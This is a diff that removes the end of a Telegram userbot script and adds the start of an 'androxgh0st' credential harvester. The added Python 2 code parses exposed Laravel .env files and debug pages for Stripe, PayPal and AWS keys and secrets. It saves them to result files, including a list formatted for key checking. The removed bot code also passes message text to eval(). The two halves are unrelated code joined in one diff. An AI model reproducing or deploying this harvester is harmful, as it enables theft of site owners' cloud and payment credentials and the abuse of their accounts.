-@app.on_message(Filters.regex("^[Ff]maker$") & Filters.me , group=34)
-def jss_foshmaker(client,message):
-
-
-    if r.get("fmaker") == "on":
-        r.set("fmaker", "off")
-        text = "FoshMaker Is `OFF` Now"
-    else:
-        r.set("fmaker", "on")
-        text = "FoshMaker Is `ON` Now"
-
-    send =app.edit_message_text(message.chat.id,message.message_id,text)
-    if r.get("autodel") == "on":
-        time.sleep(float(r.get("autodeltime")))
-        app.delete_messages(message.chat.id,[send.message_id])
-
-
-#@app.on_message(Filters.regex("^[Aa]ddserver$") & Filters.me & Filters.reply, group=35)
-#Deleted
-
-
-#@app.on_message(Filters.regex("^[Cc]onnect$") & Filters.me , group=36)
-#Deleted
-
-@app.on_message(Filters.regex("^[Ss]een? ?(.*)$") & Filters.me , group=37)
-def jss_seen(client, message):
-    if " " in message.text:
-        mode = message.text.split(" ")[1]
-        if mode == "pv":
-            if "pv" in r.smembers("seen:mode"):
-                r.srem("seen:mode", "pv")
-                text = "pv Deleted from MarkList"
-            else:
-                r.sadd("seen:mode", "pv")
-                text = "pv Added to MarkList"
-        elif mode == "channel":
-            if "channel" in r.smembers("seen:mode"):
-                r.srem("seen:mode", "channel")
-                text = "channel Deleted from MarkList"
-            else:
-                r.sadd("seen:mode", "channel")
-                text = "channel Added to MarkList"
-        elif mode == "sgroup":
-            if "sgroup" in r.smembers("seen:mode"):
-                r.srem("seen:mode", "sgroup")
-                text = "sgroup(SuperGroups) Deleted from MarkList"
-            else:
-                r.sadd("seen:mode", "sgroup")
-                text = "sgroup(SuperGroups) Added to MarkList"
-
-    else:
-        if r.get("autoseen") == "on":
-            r.set("autoseen", "off")
-            text = "AutoSeen(Markread) Is `OFF` Now"
-        else:
-            r.set("autoseen", "on")
-            text = "AutoSeen(Markread) Is `ON` Now"
-
-    send =app.edit_message_text(text=text,
-            chat_id=message.chat.id,
-            message_id=message.message_id,)
-    if r.get("autodel") == "on":
-        time.sleep(float(r.get("autodeltime")))
-        app.delete_messages(message.chat.id,[send.message_id])
-
-
-@app.on_message(Filters.incoming & Filters.private, group=38)
-def jss_in_priv(client, message):
-    chatid = message.chat.id
-    jss_incoming(message)
-    if str(chatid) in r.smembers("mark"):
-        mark(app, message)
-        return
-    elif r.get("autoseen") == "on":
-        chatid = message.chat.id
-        if str(chatid) in r.smembers("unmark"): return
-        if "pv" not in r.smembers("seen:mode"): return
-        mark(app, message)
-        return
-    else:return
-
-@app.on_message(Filters.incoming & Filters.channel, group=39)
-def jss_in_channel(client, message):
-    chatid = message.chat.id
-    if str(chatid) in r.smembers("mark"):
-        mark(app, message)
-        return
-    elif r.get("autoseen") == "on":
-        chatid = message.chat.id
-        if str(chatid) in r.smembers("unmark"): return
-        if "channel" not in r.smembers("seen:mode"): return
-        mark(app, message)
-        return
-    else:return
-
-@app.on_message(Filters.incoming & Filters.group, group=40)
-def jss_in_sgroup(client, message):
-    chatid = message.chat.id
-    jss_incoming(message)
-    if str(chatid) in r.smembers("mark"):
-        mark(app, message)
-        return
-    elif r.get("autoseen") == "on":
-        chatid = message.chat.id
-        if str(chatid) in r.smembers("unmark"): return
-        if "sgroup" not in r.smembers("seen:mode"): return
-        mark(app, message)
-        return
-    else:return
-
-
-def l_unmark(message):
-
-    text = "UnmarkList:\n"
-    count = 1
-    for i in r.smembers("unmark"):
-        text = text + f"{count} - `{i}`\n"
-        count += 1
-    send =app.edit_message_text(text=text,
-            chat_id=message.chat.id,
-            message_id=message.message_id,)     
-    if r.get("autodel") == "on":
-        time.sleep(float(r.get("autodeltime")))
-        app.delete_messages(message.chat.id,[send.message_id])
-
-
-@app.on_message(Filters.regex("^[Uu]nmark? ?(.*)$") & Filters.me, group=41)
-def jss_addordelunmark(client, message):
-    if " " in message.text:
-        chatid = str(message.text.split(" ")[1])
-        if chatid in r.smembers("unmark"):
-            r.srem("unmark", chatid)
-            text = "The Chat Deleted from UnmarkList"
-        else:
-            r.sadd("unmark", chatid)
-            text = "The Chat Added to UnmarkList"
-    else:
-        chatid = str(message.chat.id)
-        if chatid in r.smembers("unmark"):
-            r.srem("unmark", chatid)
-            text = "This Chat Deleted from UnmarkList"
-        else:
-            r.sadd("unmark", chatid)
-            text = "This Chat Added to UnmarkList\nDont Mark Anyway"
-    send =app.edit_message_text(text=text,
-            chat_id=message.chat.id,
-            message_id=message.message_id,)     
-    if r.get("autodel") == "on":
-        time.sleep(float(r.get("autodeltime")))
-        app.delete_messages(message.chat.id,[send.message_id])
-
-
-#@app.on_message(Filters.regex("GET") & Filters.me, group=42)
-
-
-
-
-def l_mark(message):
-    text = "MarkList:\n"
-    count = 1
-    for i in r.smembers("mark"):
-        text = text + f"{count} - `{i}`\n"
-        count += 1
-    send =app.edit_message_text(text=text,
-            chat_id=message.chat.id,
-            message_id=message.message_id,)     
-    if r.get("autodel") == "on":
-        time.sleep(float(r.get("autodeltime")))
-        app.delete_messages(message.chat.id,[send.message_id])
-
-
-
-@app.on_message(Filters.regex("^[Mm]ark") & Filters.me, group=43)
-def jss_addmark(client, message):
-    chatid = str(message.chat.id)
-    if chatid in r.smembers("mark"):
-        r.srem("mark", chatid)
-        text = "This Chat Deleted from MarkList"
-    else:
-        r.sadd("mark", chatid)
-        text = "This Chat Added to MarkList\nMark Anyway"
-    send =app.edit_message_text(text=text,
-            chat_id=message.chat.id,
-            message_id=message.message_id,)     
-    if r.get("autodel") == "on":
-        time.sleep(float(r.get("autodeltime")))
-        app.delete_messages(message.chat.id,[send.message_id])
-
-
-@app.on_message(Filters.regex("^[Pp]rice (.*)$") & Filters.me, group=44)
-def jss_getprice(client, message):
-    userid = message.from_user.id
-    if str(userid) not in r.smembers("vip"):return
-    text = list_of_coin()
-    args = str(message.text.split(" ")[1])
-    if args == "channel" or args == "Channel":
-        chatid = r.get("cchannel")
-    else: chatid = message.chat.id
-    app.send_message(chat_id=chatid,text=text)
-    
-@app.on_message(Filters.regex("^[Rr]set (.*)$") & Filters.me, group=45)
-def jss_rset(client, message):
-    if message.text.count(" ") == 2:
-        args = message.text.split(" ")
-        r.set(args[1], args[2])
-        text = f"{args[1]} Seted to {args[2]} in Redis"
-    send =app.edit_message_text(text=text,
-            chat_id=message.chat.id,
-            message_id=message.message_id,)     
-    if r.get("autodel") == "on":
-        time.sleep(float(r.get("autodeltime")))
-        app.delete_messages(message.chat.id,[send.message_id])
-
-@app.on_message(Filters.regex("^[Rr]sadd (.*)$") & Filters.me, group=46)
-def jss_rset(client, message):
-    if message.text.count(" ") == 2:
-        args = message.text.split(" ")
-        r.sadd(args[1], args[2])
-        text = f"{args[2]} Added to {args[1]} in Redis"
-    send =app.edit_message_text(text=text,
-            chat_id=message.chat.id,
-            message_id=message.message_id,)     
-    if r.get("autodel") == "on":
-        time.sleep(float(r.get("autodeltime")))
-        app.delete_messages(message.chat.id,[send.message_id])
-
-@app.on_message(Filters.regex("^[Rr]srem (.*)$") & Filters.me, group=47)
-def jss_rset(client, message):
-    if message.text.count(" ") == 2:
-        args = message.text.split(" ")
-        r.srem(args[1], args[2])
-        text = f"{args[2]} Removed from {args[1]} in Redis"
-    send =app.edit_message_text(text=text,
-            chat_id=message.chat.id,
-            message_id=message.message_id,)     
-    if r.get("autodel") == "on":
-        time.sleep(float(r.get("autodeltime")))
-        app.delete_messages(message.chat.id,[send.message_id])
-
-
-def l_help(message):
-    text = """
-List Help
-cmds:
-
-f `OR` fosh = show fosh list
-black `OR` blacklist `OR` b = show blacklist
-action  `OR` a = show actionlist
-help `OR` h = show this message
-cmd  `OR` c = show cmdlist
-um `OR unmark = show unmarklist
-mark = show Marklist
-
-List <cmd> OR list <cmd>
-[Dd]el <cmd> <num>
-"""
-    send =app.edit_message_text(text=text,
-            chat_id=message.chat.id,
-            message_id=message.message_id,)     
-    if r.get("autodel") == "on":
-        time.sleep(float(r.get("autodeltime")))
-        app.delete_messages(message.chat.id,[send.message_id])
-
-
-
-def l_mute(message, name):
-    text = f"{name} Mute list:\n"
-    count = 1
-    for i in r.smembers(f"mute:{name}"):
-        text = text + f"{count} - `{i}`\n"
-        count += 1
-    send =app.edit_message_text(text=text,
-            chat_id=message.chat.id,
-            message_id=message.message_id,)     
-    if r.get("autodel") == "on":
-        time.sleep(float(r.get("autodeltime")))
-        app.delete_messages(message.chat.id,[send.message_id])
-
-
-@app.on_message(Filters.regex("^[Ll]ist (.*)$") & Filters.me, group=48)
-def jss_listt(client, message):
-    name = message.text.split(" ")[1]
-    if name in ("f", "fosh"):
-        l_listf(message) 
-    elif name in ("black", "blacklist", "b"):
-        l_blacklist(message)
-    elif name in ("action", "a"):
-        l_action(message)
-    elif name in ("help", "h"):
-        l_help(message)
-    elif name in ("cmd", "c"):
-        l_cmdlist(message)
-    elif name in ("unmark", "um"):
-        l_unmark(message)
-    elif name in ("mark"):
-        l_mark(message)
-    elif name == "m":
-        a = message.text.split(" ")[2]
-        l_mute(message, a)
-    else:return
-
-
-
-@app.on_message(Filters.regex("^[Dd]el (.*) (.*)$") & Filters.me, group=49)
-def jss_ddel(client, message):
-    name = message.text.split(" ")[1]
-    num = message.text.split(" ")[2]
-    if name in ("f", "fosh"):
-        rname = "fosh" 
-    elif name in ("black", "blacklist", "b"):
-        rname = "blacklist"
-    elif name in ("action", "a"):
-        rname = "chataction"
-    elif name in ("unmark", "um"):
-        rname = "unmark"
-    elif name in ("mark"):
-        rname = "mark"
-    elif name == "m":
-        a = message.text.split(" ")[2]
-        num = message.text.split(" ")[3]
-        rname = "mute" + a
-    else: return
-        
-    try:
-        num = int(num) - 1
-        p = list(r.smembers(rname))[num]
-        r.srem(rname, p)
-        text = f"{p} Removed from {rname} :)"
-
-    except:
-        text = f"Somthing rong! ,try again"
-
-
-    send =app.edit_message_text(text=text,
-            chat_id=message.chat.id,
-            message_id=message.message_id,)     
-    if r.get("autodel") == "on":
-        time.sleep(float(r.get("autodeltime")))
-        app.delete_messages(message.chat.id,[send.message_id])
-
-
-
-
-
-#Fuck this shit 
-#@app.on_message(Filters.regex("^[Bb]io? ?(.*)$" & filters.me) , group=50)
-def bio(client,message):
-
-    if " " in message.text:
-
-        args = message.text.split(" ")
-        mode =  args[1]
-
-        #r.set("UpdateBio","False")
-        if mode == "timer":
-            r.set("bioaction", "timer")
-            bio = "timer"
-            text = f"BioAction `{bio}` Set Shode!"
-        else:
-            bio = " ".join(args[1:])
-            r.set("biotext", bio)
-            text = f"Biotext Seted to `{bio}` !"
-    else:
-        if r.get("UpdateBio") == "True":
-            r.set("UpdateBio","False")
-            text = f"BioAction Off Shod!"
-
-        else:
-            r.set("UpdateBio","True")
-            text = f"BioAction On Shod!"
-            send =app.edit_message_text(text=text,
-                chat_id=message.chat.id,
-                message_id=message.message_id)
-            return bioaction()
-
-        
-    send =app.edit_message_text(text=text,
-                chat_id=message.chat.id,
-                message_id=message.message_id)
-        
-    if r.get("autodel") == "on":
-        time.sleep(float(r.get("autodeltime")))
-        app.delete_messages(message.chat.id,[send.message_id])
-
-
-def biotext():
-    if r.get("bioaction") == "timer":
-        h, m, s = jdatetime.datetime.now().strftime("%H:%M:%S").split(":")
-        Y, M, D = jdatetime.datetime.now().strftime("%y/%m/%d").split("/")
-        bio = r.get("biotext")
-        bio = bio.format(h=h, m=m, s=s, Y=Y, M=M, D=D)
-    else:
-        return False
-
-    return bio
-
-def bioaction():
- 
-    if r.get=="False":
-        return
-
-
-    print(biotext())
-    app.send(
-        functions.account.UpdateProfile(
-            about=biotext()
-        )
-    )   
-    
-    time.sleep(int(r.get("biotime")) if r.get("biotime") else 65)
-    return bioaction()
-
-
-@app.on_message(Filters.regex("^[Tt]oday$") & Filters.me ,group=50)
-def today(client,message):
-    t = jdatetime.datetime.now().strftime("%H:%M:%S")
-    d = jdatetime.datetime.now().strftime("%y/%B/%d")
-    text = f"TODAY\nClock : `{t}`\nDate : `{d}`"
-    send =app.edit_message_text(text=text,
-            chat_id=message.chat.id,
-            message_id=message.message_id,) 
-    
-
-
-
-@app.on_message(Filters.regex("[\+\-\*\%]+") & Filters.me, group=52)
-def calc(client, message):
-    text = message.text
-    out = eval(str(text))
-    send =app.edit_message_text(text=f"{text} =\n{out}",
-        chat_id=message.chat.id,
-        message_id=message.message_id,) 
-
-
-
-
-#@app.on_message(Filters.me & Filters.regex("^![Tt] (.*) (.*)$") , group=54)
-#Just JSS
-
-
-#@app.on_message(Filters.group & Filters.photo , group=55)
-#Just JSS
-    
-
-#@app.on_message(Filters.me & Filters.regex("^[Rr]iz (.*)$") , group=56)
-#Just JSS
-    
-
-app.run()
-
-
-#By JESUS
-#Version 1.1
+# _*_ coding: utf-8 _*_
+import requests, os, sys
+from re import findall as reg
+requests.packages.urllib3.disable_warnings()
+from threading import *
+from threading import Thread
+from ConfigParser import ConfigParser
+from Queue import Queue
+
+try:
+	os.mkdir('Results')
+except:
+	pass
+try:
+	os.mkdir('Results/forchecker')
+except:
+	pass
+try:
+	os.mkdir('Results/logsites')
+except:
+	pass
+
+list_region = '''us-east-1
+us-east-2
+us-west-1
+us-west-2
+af-south-1
+ap-east-1
+ap-south-1
+ap-northeast-1
+ap-northeast-2
+ap-northeast-3
+ap-southeast-1
+ap-southeast-2
+ca-central-1
+eu-central-1
+eu-west-1
+eu-west-2
+eu-west-3
+eu-south-1
+eu-north-1
+me-south-1
+sa-east-1'''
+pid_restore = '.yukin0shita_session'
+
+class Worker(Thread):
+	def __init__(self, tasks):
+		Thread.__init__(self)
+		self.tasks = tasks
+		self.daemon = True
+		self.start()
+
+	def run(self):
+		while True:
+			func, args, kargs = self.tasks.get()
+			try: func(*args, **kargs)
+			except Exception, e: print e
+			self.tasks.task_done()
+
+class ThreadPool:
+	def __init__(self, num_threads):
+		self.tasks = Queue(num_threads)
+		for _ in range(num_threads): Worker(self.tasks)
+
+	def add_task(self, func, *args, **kargs):
+		self.tasks.put((func, args, kargs))
+
+	def wait_completion(self):
+		self.tasks.join()
+
+class androxgh0st:
+	def payment_api(self, text, url):
+		if "PAYPAL_" in text:
+			save = open('Results/paypal_sandbox.txt','a')
+			save.write(url+'\n')
+			save.close()
+			return True
+		elif "STRIPE_KEY" in text:
+			if "STRIPE_KEY=" in text:
+				method = '/.env'
+				try:
+					stripe_key = reg('\nSTRIPE_KEY=(.*?)\n', text)[0]
+				except:
+					stripe_key = ''
+				try:
+					stripe_secret = reg('\nSTRIPE_SECRET={.*?)\n', text)[0]
+				except:
+					stripe_secret = ''
+			elif "<td>STRIPE_SECRET</td>" in text:
+				method = 'debug'
+				try:
+					stripe_key = reg('<td>STRIPE_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+				except:
+					stripe_key = ''
+				try:
+					stripe_secret = reg('<td>STRIPE_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+				except:
+					stripe_secret = ''
+			build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nSTRIPE_KEY: '+str(stripe_key)+'\nSTRIPE_SECRET: '+str(stripe_secret)
+			remover = str(build).replace('\r', '')
+			save = open('Results/STRIPE.txt', 'a')
+			save.write(remover+'\n\n')
+			save.close()
+			saveurl = open('Results/logsites/stripesite.txt','a')
+			removerurl = str(url).replace('\r', '')
+			saveurl.write(removerurl+'\n')
+			saveurl.close()
+		else:
+			return False
+
+	def get_aws_region(self, text):
+		reg = False
+		for region in list_region.splitlines():
+			if str(region) in text:
+				return region
+				break
+
+	def get_aws_data(self, text, url):
+		try:
+			if "AWS_ACCESS_KEY_ID" in text:
+				if "AWS_ACCESS_KEY_ID=" in text:
+					method = '/.env'
+					try:
+						aws_key = reg("\nAWS_ACCESS_KEY_ID=(.*?)\n", text)[0]
+					except:
+						aws_key = ''
+					try:
+						aws_sec = reg("\nAWS_SECRET_ACCESS_KEY=(.*?)\n", text)[0]
+					except:
+						aws_sec = ''
+					try:
+						asu = androxgh0st().get_aws_region(text)
+						if asu:
+							aws_reg = asu
+						else:
+							aws_reg = ''
+					except:
+						aws_reg = ''
+				elif "<td>AWS_ACCESS_KEY_ID</td>" in text:
+					method = 'debug'
+					try:
+						aws_key = reg("<td>AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
+					except:
+						aws_key = ''
+					try:
+						aws_sec = reg("<td>AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
+					except:
+						aws_sec = ''
+					try:
+						asu = androxgh0st().get_aws_region(text)
+						if asu:
+							aws_reg = asu
+						else:
+							aws_reg = ''
+					except:
+						aws_reg = ''
+				if aws_reg == "":
+					aws_reg = "aws_unknown_region--"
+				if aws_key == "" and aws_sec == "":
+					return False
+				else:
+					build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nAWS ACCESS KEY: '+str(aws_key)+'\nAWS SECRET KEY: '+str(aws_sec)+'\nAWS REGION: '+str(aws_reg)+'\nAWS BUCKET: '
+					remover = str(build).replace('\r', '')
+					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
+					save.write(remover+'\n\n')
+					save.close()
+					remover = str(build).replace('\r', '')
+					save2 = open('Results/aws_access_key_secret.txt', 'a')
+					save2.write(remover+'\n\n')
+					save2.close()
+					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
+					remover2 = str(build_forchecker).replace('\r', '')
+					save3 = open('Results/forchecker/aws_secretkey.txt','a')
+					save3.write(remover2+'\n')
+					save3.close()
+				return True
+			elif "AWS_KEY" in text:
+				if "AWS_KEY=" in text:
+					method = '/.env'
+					try:
+						aws_key = reg("\nAWS_KEY=(.*?)\n", text)[0]
+					except:
+						aws_key = ''
+					try:
+						aws_sec = reg("\nAWS_SECRET=(.*?)\n", text)[0]
+					except:
+						aws_sec = ''
+					try:
+						asu = androxgh0st().get_aws_region(text)
+						if asu:
+							aws_reg = asu
+						else:
+							aws_reg = ''
+					except:
+						aws_reg = ''
+					try:
+						aws_buc = reg("\nAWS_BUCKET=(.*?)\n", text)[0]
+					except:
+						aws_buc = ''
+				elif "<td>AWS_KEY</td>" in text:
+					method = 'debug'
+					try:
+						aws_key = reg("<td>AWS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
+					except:
+						aws_key = ''
+					try:
+						aws_sec = reg("<td>AWS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
+					except:
+						aws_sec = ''
+					try:
+						asu = androxgh0st().get_aws_region(text)
+						if asu:
+							aws_reg = asu
+						else:
+							aws_reg = ''
+					except:
+						aws_reg = ''
+					try:
+						aws_buc = reg("<td>AWS_BUCKET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
+					except:
+						aws_buc = ''
+				if aws_reg == "":
+					aws_reg = "aws_unknown_region--"
+				if aws_key == "" and aws_sec == "":
+					return False
+				else:
+					build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nAWS ACCESS KEY: '+str(aws_key)+'\nAWS SECRET KEY: '+str(aws_sec)+'\nAWS REGION: '+str(aws_reg)+'\nAWS BUCKET: '+str(aws_buc)
+					remover = str(build).replace('\r', '')
+					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
+					save.write(remover+'\n\n')
+					save.close()
+					remover = str(build).replace('\r', '')
+					save2 = open('Results/aws_access_key_secret.txt', 'a')
+					save2.write(remover+'\n\n')
+					save2.close()
+					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
+					remover2 = str(build_forchecker).replace('\r', '')
+					save3 = open('Results/forchecker/aws_secretkey.txt','a')
+					save3.write(remover2+'\n')
+					save3.close()
+				return True
+			elif "AWS_SNS_KEY" in text:
+				if "AWS_SNS_KEY=" in text:
+					method = '/.env'
+					try:
+					   aws_key = reg("\nAWS_SNS_KEY=(.*?)\n", text)[0]
+					except:
+						aws_key = ''
+					try:
+						aws_sec = reg("\nAWS_SNS_SECRET=(.*?)\n", text)[0]
+					except:
+						aws_sec = ''
+					try:
+						sms_from = reg("\nSMS_FROM=(.*?)\n", text)[0]
+					except:
+						sms_from = ''
+					try:
+						sms_driver = reg("\nSMS_DRIVER=(.*?)\n", text)[0]
+					except:
+						sms_deiver = ''
+					try:
+						asu = androxgh0st().get_aws_region(text)
+						if asu:
+							aws_reg = asu
+						else:
+							aws_reg = ''
+					except:
+						aws_reg = ''
+				elif "<td>AWS_SNS_KEY</td>" in text:
+					method = 'debug'
+					try:
+						aws_key = reg("<td>AWS_SNS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
+					except:
+						aws_key = ''
+					try:
+						aws_sec = reg("<td>AWS_SNS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
+					except:
+						aws_sec = ''
+					try:
+						sms_from = reg("<td>SMS_FROM=<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
+					except:
+						sms_from = ''
+					try:
+						sms_driver = reg("<td>SMS_DRIVER<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
+					except:
+						sms_driver = ''
+					try:
+						asu = androxgh0st().get_aws_region(text)
+						if asu:
+							aws_reg = asu
+						else:
+							aws_reg = ''
+					except:
+						aws_reg = ''
+				if aws_reg == "":
+					aws_reg = "aws_unknown_region--"
+				if aws_key == "" and aws_sec == "":
+					return False
+				else:
+					build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nAWS SNS KEY: '+str(aws_key)+'\nAWS SNS KEY: '+str(aws_sec)+'\nAWS REGION: '+str(aws_reg)+'\nAWS BUCKET: \nSMS FROM: '+str(sms_from)+'\nSMS DRIVER: '+str(sms_driver)
+					remover = str(build).replace('\r', '')
+					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
+					save.write(remover+'\n\n')
+					save.close()
+					remover = str(build).replace('\r', '')
+					save2 = open('Results/aws_sns_key_secret.txt', 'a')
+					save2.write(remover+'\n\n')
+					save2.close()
+					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
+					remover2 = str(build_forchecker).replace('\r', '')
+					save3 = open('Results/forchecker/aws_secretkey.txt','a')
+					save3.write(remover2+'\n')
+					save3.close()
+				return True
+			elif "AWS_S3_KEY" in text:
+				if "AWS_S3_KEY=" in text:
+					method = '/.env'
+					try:
+					   aws_key = reg("\nAWS_S3_KEY=(.*?)\n", text)[0]
+					except:
+						aws_key = ''
+					try:
+						aws_sec = reg("\nAWS_S3_SECRET=(.*?)\n", text)[0]
+					except:
+						aws_sec = ''
+					try:
+						asu = androxgh0st().get_aws_region(text)
+						if asu:
+							aws_reg = asu
+						else:
+							aws_reg = ''
+					except:
+						aws_reg = ''
+				elif "<td>AWS_S3_KEY</td>" in text:
+					method = 'debug'
+					try:
+						aws_key = reg("<td>AWS_S3_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
+					except:
+						aws_key = ''
+					try:
+						aws_sec = reg("<td>AWS_S3_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
+					except:
+						aws_sec = ''
+					try:
+						asu = androxgh0st().get_aws_region(text)
+						if asu:
+							aws_reg = asu
+						else:
+							aws_reg = ''
+					except:
+						aws_reg = ''
+				if aws_reg == "":
+					aws_reg = "aws_unknown_region--"
+				if aws_key == "" and aws_sec == "":
+					return False
+				else:
+					build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nAWS ACCESS KEY: '+str(aws_key)+'\nAWS SECRET KEY: '+str(aws_sec)+'\nAWS REGION: '+str(aws_reg)+'\nAWS BUCKET: '
+					remover = str(build).replace('\r', '')
+					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
+					save.write(remover+'\n\n')
+					save.close()
+					remover = str(build).replace('\r', '')
+					save2 = open('Results/aws_access_key_secret.txt', 'a')
+					save2.write(remover+'\n\n')
+					save2.close()
+					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
+					remover2 = str(build_forchecker).replace('\r', '')
+					save3 = open('Results/forchecker/aws_secretkey.txt','a')
+					save3.write(remover2+'\n')
+					save3.close()
+				return True
+			elif "AWS_SES_KEY" in text:
+				if "AWS_SES_KEY=" in text:
+					method = '/.env'
+					try:
+					   aws_key = reg("\nAWS_SES_KEY=(.*?)\n", text)[0]
+					except:
+						aws_key = ''
+					try:
+						aws_sec = reg("\nAWS_SES_SECRET=(.*?)\n", text)[0]
+					except:
+						aws_sec = ''
+					try:
+						asu = androxgh0st().get_aws_region(text)
+						if asu:
+							aws_reg = asu
+						else:
+							aws_reg = ''
+					except:
+						aws_reg = ''
+				elif "<td>AWS_SES_KEY</td>" in text:
+					method = 'debug'
+					try:
+						aws_key = reg("<td>AWS_SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
+					except:
+						aws_key = ''
+					try:
+						aws_sec = reg("<td>AWS_SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
+					except:
+						aws_sec = ''
+					try:
+						asu = androxgh0st().get_aws_region(text)
+						if asu:
+							aws_reg = asu
+						else:
+							aws_reg = ''
+					except:
+						aws_reg = ''
+				if aws_reg == "":
+					aws_reg = "aws_unknown_region--"
+				if aws_key == "" and aws_sec == "":
+					return False
+				else:
+					build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nAWS ACCESS KEY: '+str(aws_key)+'\nAWS SECRET KEY: '+str(aws_sec)+'\nAWS REGION: '+str(aws_reg)+'\nAWS BUCKET: '
+					remover = str(build).replace('\r', '')
+					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
+					save.write(remover+'\n\n')
+					save.close()
+					remover = str(build).replace('\r', '')
+					save2 = open('Results/aws_access_key_secret.txt', 'a')
+					save2.write(remover+'\n\n')
+					save2.close()
+					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
+					remover2 = str(build_forchecker).replace('\r', '')
+					save3 = open('Results/forchecker/aws_secretkey.txt','a')
+					save3.write(remover2+'\n')
+					save3.close()
+				return True
+			elif "SES_KEY" in text:
+				if "SES_KEY=" in text:
+					method = '/.env'
+					try:
+					   aws_key = reg("\nSES_KEY=(.*?)\n", text)[0]
+					except:
+						aws_key = ''
+					try:
+						aws_sec = reg("\nSES_SECRET=(.*?)\n", text)[0]
+					except:
+						aws_sec = ''
+					try:
+						asu = androxgh0st().get_aws_region(text)
+						if asu:
+							aws_reg = asu
+						else:
+							aws_reg = ''
+					except:
+						aws_reg = ''
+				elif "<td>SES_KEY</td>" in text:
+					method = 'debug'
+					try:
+						aws_key = reg("<td>SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
+					except:
+						aws_key = ''
+					try:
+						aws_sec = reg("<td>SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
+					except:
+						aws_sec = ''
+					try:
+						asu = androxgh0st().get_aws_region(text)
+						if asu:
+							aws_reg = asu
+						else:
+							aws_reg = ''
+					except:
+						aws_reg = ''
+				if aws_reg == "":
+					aws_reg = "aws_unknown_region--"
+				if aws_key == "" and aws_sec == "":
+					return False
+				else:
+					build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nAWS ACCESS KEY: '+str(aws_key)+'\nAWS SECRET KEY: '+str(aws_sec)+'\nAWS REGION: '+str(aws_reg)+'\nAWS BUCKET: '
+					remover = str(build).replace('\r', '')
+					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
+					save.write(remover+'\n\n')
+					save.close()
+					remover = str(build).replace('\r', '')
+					save2 = open('Results/aws_access_key_secret.txt', 'a')
+					save2.write(remover+'\n\n')
+					save2.close()
+					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
+					remover2 = str(build_forchecker).replace('\r', '')
+					save3 = open('Results/forchecker/aws_secretkey.txt','a')
+					save3.write(remover2+'\n')
+					save3.close()
+				return True
+			elif "AWS_ACCESS_KEY_ID_2" in str(text):
+				if "AWS_ACCESS_KEY_ID_2=" in str(text):
+					method = '/.env'
+					try:
+					   aws_key = reg("\nAWS_ACCESS_KEY_ID_2=(.*?)\n", text)[0]
+					except:
+						aws_key = ''
+					try:
+						aws_sec = reg("\nAWS_SECRET_ACCESS_KEY_2=(.*?)\n", text)[0]
+					except:
+						aws_sec = ''
+					try:
+						asu = androxgh0st().get_aws_region(text)
+						if asu:
+							aws_reg = asu
+						else:
+							aws_reg = ''
+					except:
+						aws_reg = ''
+				elif "<td>AWS_ACCESS_KEY_ID_2</td>" in text:
+					method = 'debug'
+					try:
+						aws_key = reg("<td>AWS_ACCESS_KEY_ID_2<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
+					except:
+						aws_key = ''
+					try:
+						aws_sec = reg("<td>AWS_SECRET_ACCESS_KEY_2<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
+					except:
+						aws_sec = ''
+					try:
+						asu = androxgh0st().get_aws_region(text)
+						if asu:
+							aws_reg = asu
+						else:
+							aws_reg = ''
+					except:
+						aws_reg = ''
+				if aws_reg == "":
+					aws_reg = "aws_unknown_region--"
+				if aws_key == "" and aws_sec == "":
+					return False
+				else:
+					build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nAWS ACCESS KEY: '+str(aws_key)+'\nAWS SECRET KEY: '+str(aws_sec)+'\nAWS REGION: '+str(aws_reg)+'\nAWS BUCKET: '
+					remover = str(build).replace('\r', '')
+					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
+					save.write(remover+'\n\n')
+					save.close()
+					remover = str(build).replace('\r', '')
+					save2 = open('Results/aws_access_key_secret.txt', 'a')
+					save2.write(remover+'\n\n')
+					save2.close()
+					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
